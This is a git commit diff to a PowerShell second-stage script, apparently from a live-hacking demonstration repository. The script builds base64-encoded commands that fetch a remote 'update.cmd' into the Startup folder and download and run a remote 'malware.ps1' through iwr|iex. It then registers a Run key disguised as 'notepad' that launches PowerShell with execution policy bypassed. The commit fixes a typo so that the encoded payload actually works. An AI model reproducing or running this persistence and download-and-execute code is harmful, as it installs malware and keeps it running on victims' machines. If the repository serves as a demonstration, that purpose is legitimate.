1a403e79605159a4c84f4a808896486aa0f0169b
Melfice60 <96183356+Melfice60@users.noreply.github.com>
2024-06-05 15:23:44 +0200

    Update stage-2.ps1

--- stage-2.ps1
+++ stage-2.ps1
@@ -3,8 +3,8 @@ $regPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
 # Définition de la commande PowerShell à exécuter au démarrage
 $command1 = "Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/FranceCyberDefense/Live-Hack/main/update.cmd' -OutFile '$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\update.cmd'"
 $command2 = "(New-Object Net.WebClient).Proxy.Credentials=[Net.CredentialCache]::DefaultNetworkCredentials;iwr https://raw.githubusercontent.com/FranceCyberDefense/Live-Hack/main/malware.ps1 -UseBasicParsing|iex"
-$c1 = [Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($commande1))
-$c2 = [Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($commande2))
+$c1 = [Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($command1))
+$c2 = [Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($command2))
 
 # Création de la nouvelle valeur dans la clé de Registre "Run"
 New-ItemProperty -Path $regPath -Name "notepad" -Value "powershell.exe -ExecutionPolicy Bypass -EncodedCommand '$c1'" -PropertyType String -Force | Out-Null
